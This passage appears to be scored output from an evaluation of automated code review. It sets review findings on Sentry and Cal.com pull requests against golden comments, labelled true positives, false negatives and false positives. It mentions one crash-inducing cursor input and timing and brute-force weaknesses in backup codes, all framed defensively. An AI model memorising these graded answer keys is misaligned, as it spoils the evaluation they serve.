Both the BasePaginator change at line ~179 and the OptimizedCursorPaginator comment at line ~876 assert 'the underlying queryset will handle boundary conditions' / 'The underlying Django ORM properly handles negative slicing automatically'. This is incorrect: Django raises AssertionError on negative slice indices. Comments that document safety properties that are not true make future debugging harder and may cause contributors to rely on a guarantee that does not exist.

Cursor accepts arbitrary int offset with no validation

Cursor.__init__ now advertises 'Allow negative offsets for advanced pagination scenarios' but accepts any integer without bound or sign validation. Combined with the broken negative-offset handling downstream, this lets any caller of Cursor.from_string feed extreme or malicious values (e.g. -2**31) into the paginator. Even with negative-offset slicing eventually corrected upstream, an attacker can still trigger expensive queries via large positive offsets (which are also unbounded).

Endpoint unconditionally enables broken advanced pagination path

When the user is a superuser or has global access, the endpoint passes `enable_advanced_features=True` to OptimizedCursorPaginator. Combined with the fact that `Cursor.__str__`/`from_string` round-trip a user-supplied integer offset verbatim, any such user can craft a cursor with a negative value (e.g. `?cursor=0:-1:0`) to crash the endpoint with AssertionError. There is no validation, no length/offset bound check, and no fallback; the new paginator code path is a denial-of-service for the most privileged users. The gating mechanism is also confused: `optimized_pagination=true` from the request is checked but plays no role, while the actual crash vector (cursor.offset) is unvalidated.

KeyError if end_timestamp_precise is missing from event

The factory reads `end_timestamp_precise=val["end_timestamp_precise"]` with direct subscript access. Unlike `parent_span_id`, which is read via `val.get(...)`, this field is treated as required. The SpanEvent schema may evolve or upstream producers (older relays, batched ingest) may omit it; any such event will raise KeyError inside the consumer, killing the batch and potentially stalling the partition. The newly added test only covers the happy path where the field is present.

No tests cover the new >1000-span eviction behavior

The Lua script's `zpopmin`-based eviction when span_count > 1000 is a new behavioral guarantee with data-integrity implications, but no test inserts more than a handful of spans per segment. There is no test for: (a) which spans get evicted (oldest by end_timestamp_precise?); (b) that the eviction actually caps cardinality at 1000; (c) that segments exceeding 1000 spans still flush correctly and don't get dropped; (d) that the metric/observability for evictions exists. The PR therefore lacks coverage of its headline feature.

OptimizedCursorPaginator duplicates Paginator almost verbatim

The new OptimizedCursorPaginator re-implements get_item_key and value_from_cursor exactly as Paginator does (Paginator already inherits these from BasePaginator), and re-implements get_result as a near-copy of BasePaginator.get_result. The only meaningful difference is the `enable_advanced_features` branch that itself crashes. This is dead code masquerading as a feature; it is brittle (any future change to BasePaginator.get_result will need to be mirrored) and the misleading docstring advertises capabilities (negative offsets) that don't actually work.

Redirect chain depth limit silently lowered 10x

The redirect-resolution loop cap was reduced from 10000 to 1000, removing the previous safety comment about depth 10k. The PR description provides no rationale for this change. Any trace whose segment tree has a redirect chain between 1001 and 10000 deep will now exit the loop before resolving to the final set_span_id, leaving the new span attached to a stale set and producing a split/broken segment instead of one correctly-merged segment. This change affects production correctness for deeply nested traces and is not covered by tests.

Silent per-span data loss replaces whole-segment drop

When the post-union ZSET cardinality exceeds 1000, the script executes `zpopmin` to drop the oldest (lowest end_timestamp_precise) members. This is a fundamental semantic change from the previous consumer-side check in buffer.py (which dropped the entire segment via `del payloads[key]`) to silently dropping individual members during insertion. For traces where the root span arrives late, child spans already buffered can be evicted before the root arrives, producing incomplete segments that are still flushed downstream with no error. There is no metric for evicted spans, no test coverage, and the eviction strategy (lowest end_timestamp_precise) is not justified.

Test payloads omit end_timestamp_precise validation

Existing tests were retrofitted to add `end_timestamp_precise=1700000000.0`, but the only new test value is a constant used uniformly. There is no test asserting that missing end_timestamp_precise produces a clear error (vs. the KeyError that the current code raises), no test for non-finite or negative values, and no test verifying that two spans with the same end_timestamp_precise are still both retained (zadd behavior on score collision is not asserted).

ZUNIONSTORE default SUM aggregation distorts end_timestamp_precise scores

Both unions use the default `AGGREGATE SUM` semantics: when the same member is present in both the destination set_key and the incoming source (parent_key on the second union, span_key on the first if a previous batch had landed it there), the resulting score becomes `original_score + new_score` instead of staying at `end_timestamp_precise`. This makes scores meaningless sums of microsecond-precision timestamps, which silently changes the ordering produced by `zscan` and biases `zpopmin` eviction (summed members get higher scores, making them less likely to be evicted). It is also undocumented and not tested.

max_segment_spans parameter no longer enforced

SpansBuffer still accepts `max_segment_spans: int = 1001` in __init__ but the consumer-side enforcement that used this limit in _load_segment_data was deleted without removing the parameter. The limit is now controlled entirely by the hardcoded 1000 in add-buffer.lua. Any caller that tuned max_segment_spans is silently overridden by a magic number in the Lua script; the parameter is dead config.

zscan on legacy SET keys will raise WRONGTYPE during deploys

The consumer now issues `p.zscan(key, ...)` against every segment key, but the on-disk format previously used Redis SETs. On rolling deploys where new consumer instances coexist with old data, or after a partial rollback, zscan against a SET key returns `WRONGTYPE Operation against a key holding the wrong kind of value`. There is no version/key-type check, no migration step, and no metric for this condition, so segments will silently fail to load and the consumer will lose data for the affected trace until the keys TTL out.

true_positives.golden_comment: The upsampling eligibility check passes the outer dataset instead of the actual dataset used by scoped_dataset. In paths where the query ultimately runs against discover (e.g., dashboard split) while the original dataset is metrics, upsampling may be skipped even when all projects are allowlisted.
true_positives.matched_candidate:
Upsampling eligibility check uses outer `dataset` instead of the dataset actually being queried

Inside `_get_event_stats`, the helper is invoked with the closure-captured `dataset` (the dataset requested by the client) rather than the function's `scoped_dataset` argument, which is the dataset actually executed against. In `get_event_stats_factory`, widget-splitting can pass a different `split_dataset` (e.g. `discover` when the original requested dataset is `transactions`), and `_should_apply_sample_weight_transform` then evaluates `dataset == errors/transactions/discover` against the wrong dataset. The result is that upsampling is silently skipped (or wrongly applied) for any query where the requested dataset and the executed dataset differ, including the widget split path. Pass `scoped_dataset` (or both) to `is_errors_query_for_error_upsampled_projects` so the decision is based on the dataset that will actually run.

false_negatives.golden_comment: In _set_sample_rate_from_error_sampling(), the check `if client_sample_rate:` treats 0.0 as falsy, so a sample_rate of 0.0 is silently skipped and never set on normalized_data.

Using Python’s built-in hash() to build cache keys is non-deterministic across processes (hash randomization), so keys won’t match across workers and invalidate_upsampling_cache may fail to delete them. Use a deterministic serialization of project_ids for the cache key.

false_positives.candidate:
Cache value caches only the allowlist result; the transform check still runs on every cache hit

`is_errors_query_for_error_upsampled_projects` caches only the boolean returned by `_are_all_projects_error_upsampled`. On a cache hit the function still executes `_should_apply_sample_weight_transform(dataset, request)`, which performs module-identity comparisons, parses the query string, and runs lazy imports of `sentry.snuba.discover/errors/transactions` on every call. To make the 60 s TTL actually pay off, include the relevant decision inputs (or the combined boolean) in the cache value so cache hits short-circuit the full check. At minimum, hoist the `from sentry.snuba import …` statements to module scope so a cache hit is genuinely cheap.

Integration tests do not invalidate the upsampling eligibility cache, so order-dependent failures are likely

`is_errors_query_for_error_upsampled_projects` writes `is_eligible` to the shared cache under a key derived only from `organization.id` and the sorted project IDs. The new test class exercises four different allowlist configurations against the same `(organization, [project, project2])` tuple. Without invalidating the cache (e.g. by calling the exposed `invalidate_upsampling_cache` helper or clearing the cache backend in `setUp`/`tearDown`), the first test that runs caches its result and subsequent tests will read that stale value and silently skip the upsampling path they are trying to exercise. Add cache cleanup in `setUp`/`tearDown`, or assert on the emitted SnQL instead of the response value to make the tests order-independent.

Only the literal token `count()` is rewritten; other common count-style aggregations are silently left as raw counts

`transform_query_columns_for_error_upsampling` only rewrites columns whose stripped/lowercased form is exactly the string `"count()"`. Any column with arguments (`count_if(...)`, `count_unique(...)`, `count_distinct(...)`), aliased forms (`count() AS total`), whitespace inside the parens (`count(  )`), or counts appearing inside an `equation` expression is left untouched and will be executed against `sample_weight` semantics on some datasets and raw event semantics on others. The docstring says it "transforms aggregation functions to use sum(sample_weight) instead of count()" implying plural coverage; in reality it is a single literal-string match. Either expand the matcher to cover the realistic variants or document the limitation clearly and reject unhandled inputs so callers cannot get silently-mixed semantics.

Overly broad `except Exception: pass` in _set_sample_rate_from_error_sampling hides real bugs

Two nested `try/except Exception: pass` blocks silently swallow everything, including programming errors like the `normalized_data` object not being a `MutableMapping` at all (e.g. someone refactors `store_event` and passes the wrong value). The first block only needs to handle the case where `contexts` is not a mapping (AttributeError / TypeError), and the second only needs to handle `ValueError` from `float()`. Narrow the exception types so genuine bugs surface instead of being papered over.

Repeated in-function imports of sentry.snuba modules on every call

`_should_apply_sample_weight_transform` does `from sentry.snuba import discover, errors` and `from sentry.snuba import transactions` inside the function body, executing those imports on every invocation (including every cache-hit path from `is_errors_query_for_error_upsampled_projects`). There is no circular-import reason to defer them — `sentry.snuba` does not import this helper. Move the three imports to module top-level so each call is a constant-time identity comparison.

The main public entry point `is_errors_query_for_error_upsampled_projects` and `invalidate_upsampling_cache` have no direct tests

The unit test file only exercises the private helpers `_are_all_projects_error_upsampled`, `_is_error_focused_query`, `_should_apply_sample_weight_transform`, and `transform_query_columns_for_error_upsampling`. It does not test the actual public entry point `is_errors_query_for_error_upsampled_projects` (including its caching behavior, short-circuit when the allowlist is missing, or that it combines the allowlist check with the dataset/query check correctly), nor does it test `invalidate_upsampling_cache`. Given that the function is the one wired into the request hot-path and contains the non-trivial cache logic flagged in other findings, it deserves direct unit tests.

Upsampling integration tests assert an upsampled value that requires `sample_weight` to be populated by ingest

`OrganizationEventsStatsErrorUpsamplingTest.test_error_upsampling_with_allowlisted_projects` asserts `data[0][1][0]["count"] == 10`, deriving that 10 from the stored `client_sample_rate=0.1` and the Snuba `upsampled_count() = sum(sample_weight)` definition in `discover.py`. In `SnubaTestCase` no Relay pipeline runs and `sample_weight` is not populated from the `sample_rate` set by `_set_sample_rate_from_error_sampling`; `sum(NULL)` over the column will be NULL/0 and the assertion will fail, or — even worse — pass only by accident and silently never validate the upsampling transformation. Either populate `sample_weight` in the test fixture (or wrap the assertion in a mock that returns the expected sample_weight), or split the test so that it verifies (a) the SQL emitted by `transform_query_columns_for_error_upsampling` and (b) the upsampled result via a controlled sample_weight fixture.

_is_error_focused_query misses queries that target errors by exclusion

The check only looks for the substring `event.type:error` in the raw `query` parameter. Common Sentry search syntax that targets errors by negating the transaction type (e.g. `!event.type:transaction`, or `event.type:error OR ...`) is missed — `!event.type:transaction` will return False even though it is an errors-only query, so upsampling is skipped for those queries. Worse, the substring match is naive: a query like `event.type:errorcount` (an unknown tag name in user queries) would also pass. Use the parsed token list from `event_search.parse_search_query` (the same parser the rest of this endpoint uses) and inspect the `event.type` clause's value rather than substring-matching on the raw query string.

_set_sample_rate_from_error_sampling accepts arbitrary floats including invalid sample rates

The helper writes `normalized_data["sample_rate"] = float(client_sample_rate)` whenever `client_sample_rate` is truthy and converts cleanly. It does not validate the resulting value: 0 (everything dropped → sample_weight = ∞), negative values, or values > 1 are all accepted. A client (or a misbehaving test fixture) can supply `client_sample_rate=0.0` and silently produce divide-by-zero / infinity in the server-side upsampling, or supply `client_sample_rate=-1.0` and corrupt aggregated metrics. Validate the value is in the open interval (0.0, 1.0] before assigning.

true_positives.golden_comment: Hardcoded empty data passed to TableWidgetVisualization causes it to always render an empty table instead of displaying actual results when the feature flag is enabled.

TableWidgetVisualization rendered with hard-coded empty data when feature flag is on

true_positives.golden_comment: Analytics events are recorded before the feature flag check, resulting in analytics being logged for all requests, including those that return 404 due to the feature being disabled. This can lead to misleading analytics data.
true_positives.matched_candidate:
Analytics event recorded before feature-flag check, polluting analytics with disabled usage

`analytics.record("preprod_artifact.api.assemble", ...)` is invoked on every request, before the `features.has("organizations:preprod-artifact-assemble", ...)` check that returns 404 for orgs without the flag enabled. This will record an analytics event for every caller — including unauthorized clients and orgs without the feature — biasing usage metrics. false_negatives.golden_comment: The BrowserReportingCollectorEndpoint returns HttpResponse objects but the endpoint inherits from Endpoint which expects rest_framework.response.Response objects.
In BaseDetectorTypeValidator.update(), the validator incorrectly updates instance.type using validated_data.get('detector_type') instead of validated_data.get('type').

Using zip(error_ids, events.values()) assumes the get_multi result preserves the input order; dict value order is not guaranteed to match error_ids, so event data can be paired with the wrong ID (missing nodes also shift alignment).

Validation logic incorrectly uses .get('timestamp'), which treats a timestamp of 0 as absent. It should directly check 'timestamp' in self.initial_data to ensure proper field presence detection, preventing both 'age=0' and 'timestamp' from passing mutual-exclusion validation.

false_positives.candidate:
Analytics event registration relies on side-effect import that may not run before endpoint usage

`src/sentry/preprod/__init__.py` does `from .analytics import *` purely for the side effect of `analytics.register(PreprodArtifactApiAssembleEvent)`. The endpoint `organization_preprod_artifact_assemble.py` only imports from `sentry.preprod.tasks`, not from `sentry.preprod`. If nothing else imports the `sentry.preprod` package during process startup, the event class will never be registered and `analytics.record("preprod_artifact.api.assemble", ...)` may fail or be dropped. There is no Django AppConfig / `ready()` hook in the PR to guarantee registration. Either register the event at module import inside `analytics.py` (it already self-registers) and ensure the package is imported, or add an explicit `default_app_config` so `preprod.apps.PreprodConfig.ready()` runs the registration.

Bare `except Exception` logged at INFO swallows real errors in get_environment_info

`CommitContextIntegration.get_environment_info` wraps the whole body in `except Exception as e:` and then logs at INFO level (`logger.info("get_environment_info.no-environment", extra={"issue_id": issue.id, "error": e})`). Catching the bare `Exception` base class will silently swallow programming errors, `DatabaseError`, `ObjectDoesNotExist`, etc., and logging them at INFO hides them from alerting/dashboards. Should narrow to the specific exceptions that are expected (e.g. `Group.DoesNotExist`, `Environment.DoesNotExist`) and log unexpected exceptions at `WARNING` or `EXCEPTION`.

Dead `_handle_regex_match` left behind in parametrize_w_experiments

After removing `ParameterizationRegexExperiment`, the inner function `_handle_regex_match` inside `parametrize_w_experiments` (lines ~335-343) is no longer called from the for-loop (which now unconditionally calls `experiment.run(content, _incr_counter)`). The unused closure is dead code, but it still holds a reference and is misleading to future readers who may think experiments can be regex-based.

Migration references non-existent file name in docstring

The migration docstring says `See 0921_convert_org_saved_searches_to_views_rerevised.py for the correct migration.` but no file with that name appears in the PR or in `src/sentry/migrations/` paths shown. If the intended successor migration is `0921_*` with a different suffix, both migration docstrings are wrong and a future engineer will look for a file that does not exist. Verify the correct migration name and fix the docstring, or add the referenced migration if it really is missing.

Migrations 0917/0920 neutered to no-ops with no test coverage for the deferred migration

Both `0917_convert_org_saved_searches_to_views.py` and `0920_convert_org_saved_searches_to_views_revised.py` were reduced to `return` with a comment pointing to `0921_convert_org_saved_searches_to_views_rerevised.py`. The corresponding test `tests/sentry/migrations/test_0917_convert_org_saved_searches_to_views.py` was deleted in the same PR, and there is no test for `0920`. If `0921` does not exist in the repo, or if it fails to migrate the `SavedSearch -> GroupSearchView` rows correctly, the saved-search-to-view conversion that this migration sequence was supposed to perform will not happen on any environment that runs migrations sequentially — and there is no test guarding against the wrong file being referenced. Verify that 0921 exists and add a migration test (or `TestMigrations`) that exercises the full path the comment references.

No test covers the new `use-table-widget-visualization` branch in chart.tsx

There is a `tableWidgetVisualization.spec.tsx` testing the new component in isolation, but there is no test exercising the wiring in `chart.tsx` that chooses `TableWidgetVisualization` when the feature flag is on. Given the bug above (empty hard-coded data), this integration test would have caught it. Add an APITestCase / jest test that asserts the new component is rendered with the actual `result.data` / `result.meta` when the flag is on.

Object.keys on possibly undefined meta throws TypeError

The fallback column extraction does `Object.keys(tableData?.meta.fields).map(...)`. Optional chaining on the `?.` only protects `tableData`; if `tableData.meta` is undefined (e.g. when called with `{data: []}` and no `meta`), this throws `TypeError: Cannot read properties of undefined (reading 'fields')`. The type says `meta` is always present, but the chart.tsx integration actually passes a hard-coded tableData whose meta is present in this PR but the contract is not enforced at runtime. Should be `Object.keys(tableData?.meta?.fields ?? {})` or equivalent.

PR description "Replays Self-Serve Bulk Delete System" does not match the diff contents

The PR title and description focus on a replays bulk-delete system, but the diff includes large, unrelated changes to grouping parameterization, browser reporting collector, GitHub/GitLab PR templates, autofix defaults, dashboards table widget, explore Visualize refactor (yAxes -> yAxis), feedback AI summaries, integrations, and two migrations that are turned into no-ops. None of these are described in the description. This makes the PR very hard to review and reason about; either split into focused PRs or update the description to enumerate the actual change set so reviewers know what they are signing off on.

Removed `grouping.experiments.parameterization.traceparent` option not asserted by tests

The `grouping.experiments.parameterization.traceparent` option was deleted from `src/sentry/options/defaults.py`. There are no tests in the PR asserting that no code reads this option key, and `tests/sentry/grouping/test_parameterization.py` continues to test traceparent parameterization behavior. If any deployed instance still has the option persisted in DB / Redis from before this removal, lookups for it will now fail validation when callers pass an unrecognized key — worth grepping for any remaining `options.get("grouping.experiments.parameterization.traceparent")` references and adding a deprecation removal test.

Renamed analytics event `replay.view_html` -> `replay.view-html` is a silent breaking change

`trackAnalytics('replay.view_html', ...)` was changed to `trackAnalytics('replay.view-html', ...)`. The corresponding entry in `static/app/utils/analytics/replayAnalyticsEvents.tsx` was updated and the old `replay.view_html` key was removed entirely from `ReplayEventParameters` and `replayEventMap`. Any external dashboard, alert, or query filtering on the literal `replay.view_html` event name will silently stop receiving data. The PR description does not call this out; the rename should be flagged in changelog / product docs, or the old key should be kept as an alias for at least one release.

true_positives.golden_comment: The exported function TwoFactor handles backup codes and is in BackupCode.tsx. Inconsistent naming.

Default export is named TwoFactor, not BackupCode

The file is `BackupCode.tsx` and consumers import it as `import BackupCode from "@components/auth/BackupCode"`, but the default export is declared as `export default function TwoFactor({ center = true })`. The mismatch is not a runtime error (default exports are not name-checked), but it is a clear copy/paste leftover that will confuse anyone reading the file or refactoring the codebase. Rename the function (and the display name / `displayName`) to `BackupCode`.

true_positives.golden_comment: Object URL for backup codes is not revoked on component unmount, leading to a potential memory leak. This can cause increased memory usage over time, especially if the component is mounted and unmounted frequently.
true_positives.matched_candidate:
Object URL for backup-codes download is never revoked on unmount

`URL.createObjectURL(textBlob)` is called whenever a user runs the setup, and the previous URL is revoked on the next setup, but the URL is not revoked when the component unmounts, when the modal is closed via the X / overlay, or when `onOpenChange(false)` fires. `resetState()` clears the state but does not call `URL.revokeObjectURL(backupCodesUrl)`. The blob stays in memory for the lifetime of the page, which is both a memory leak and a minor data exposure concern (the plaintext backup codes are still in the page's blob store). Revoke the URL in a cleanup effect and in `resetState`.

false_negatives.golden_comment: Error message mentions 'backup code login' but this is a disable endpoint, not login

Backup code validation is case-sensitive due to the use of indexOf(). This causes validation to fail if a user enters uppercase hex characters, as backup codes should be case-insensitive for a better user experience.

Because backupCodes are decrypted and mutated in memory before being written back, two concurrent login requests using the same backupCode could both pass this check and update, so a single backup code may effectively be accepted more than once if used concurrently, weakening the intended one-time-use semantics.

false_positives.candidate:
Backup code entropy is only 40 bits per code

Each backup code is generated as `crypto.randomBytes(5).toString("hex")`, producing a 10-character hex string with only 40 bits of entropy. Modern guidance (NIST SP 800-63B) recommends at least 64 bits of entropy for OTP secrets, and 128 bits is common. Because the code is the only thing standing between an attacker and account access (it bypasses the TOTP factor), 40 bits is brute-forceable in a realistic timeframe, especially since failed attempts do not consume the code and the API has no per-user rate limiting on the credentials provider beyond the existing email-based limiter.

Backup code is not consumed on failed attempt; timing-unsafe comparison

Two problems compound here: (1) `Array.prototype.indexOf` is not a constant-time comparison, so the time taken to find (or not find) a user-supplied backup code leaks information about how many leading bytes matched, enabling a timing side-channel that lets an attacker enumerate codes character by character. Use a constant-time comparison (e.g. compare each code with `crypto.timingSafeEqual` after length-checking). (2) The supplied code is only removed from the array after a successful match (`backupCodes[index] = null`), so failed attempts leave all 10 codes intact. Combined with the 40-bit entropy per code, this makes online brute force feasible: an attacker can submit unlimited guesses until one matches.

Backup-codes dialog buttons default to type="submit" and submit the TOTP form

The Close, Copy, and Download buttons inside the `<WithStep step={SetupStep.DisplayBackupCodes}>` block do not specify a `type` attribute, so they default to `type="submit"`. They are rendered inside the `<Form handleSubmit={handleEnable} form={form}>` which targets the TOTP form. The `e.preventDefault()` call in each onClick does stop the default for that click, but: (a) the auto-submit effect (line 157-161) watches `totpCode`, so the moment a user pastes or types in the TOTP boxes on the same screen the form will submit; (b) relying on `preventDefault` on a submit button is fragile and a maintenance trap. Add `type="button"` to all three buttons (and to the `Continue` button at line 247, which has the same issue but at least is inside a different WithStep so is less likely to fire today).

Download link is a plain <a> with no rel or sandboxing

The "Download" button is wrapped in `<a download="cal-backup-codes.txt" href={backupCodesUrl}>` with no `rel="noopener"` or `type` attribute. While `download` is set so navigation is not expected, an `href` that is a `blob:` URL still benefits from the standard hardening, and a future change that switches to a same-origin URL would silently introduce a tabnabbing vector. Add `rel="noopener noreferrer"` to be safe.

The `<Label>` renders `{t("backup_code")}` but has no `htmlFor` attribute, so screen readers do not announce it as the label for the backup-code input. Either pass an `htmlFor` matching the `id="backup-code"` on the `TextField`, or wrap the input with the label. The same `Label` import in `TwoFactor.tsx` has the same gap, so the new component was modeled on the existing bug.

No e2e test covers backup-code login or backup-code disable

The new backup-codes test only exercises the display/copy/download UI on the setup flow. There is no test for the actual auth-critical paths the PR introduces: (1) logging in with a backup code after clicking "Lost access", (2) the login path when the backup code is wrong (expect `incorrect_backup_code`), (3) disabling 2FA using a backup code from the settings modal. The author flagged this in the TODO on line 12, but these are the security-relevant paths and should not ship untested. In particular there is no regression coverage for the credential flow that consumes a code and re-encrypts the array.

Timing-unsafe backup code comparison and missing password for non-CAL users

Same `backupCodes.indexOf(...)` timing leak as in the credentials provider: a constant-time comparison should be used. More importantly, the password check at line 40 is gated on `user.password && user.identityProvider === IdentityProvider.CAL`, so for SAML/Google users the only thing required to disable 2FA is a single valid backup code. A leaked backup code therefore gives an attacker the ability to log in via the credentials provider and then turn off 2FA entirely, reducing the account to a single factor. The credentials provider should still demand something only the legitimate user possesses (e.g. re-prompt for password, or require the SAML/Google re-authentication) before 2FA can be disabled.

`handleSetup` (line 77) calls `formatBackupCode` at line 95, but `formatBackupCode` is declared with `const` at line 163, after `handleSetup` in the source. The const is in the temporal dead zone until the component body finishes executing, so any path that reaches the use before mount (e.g. an early return, a future refactor that calls `handleSetup` during render, or a test that calls the function directly) will throw `ReferenceError: Cannot access 'formatBackupCode' before initialization`. It works today only because the user has to click the button after mount. Move the helper above `handleSetup` (or extract it to module scope) so the dependency order matches the source order.
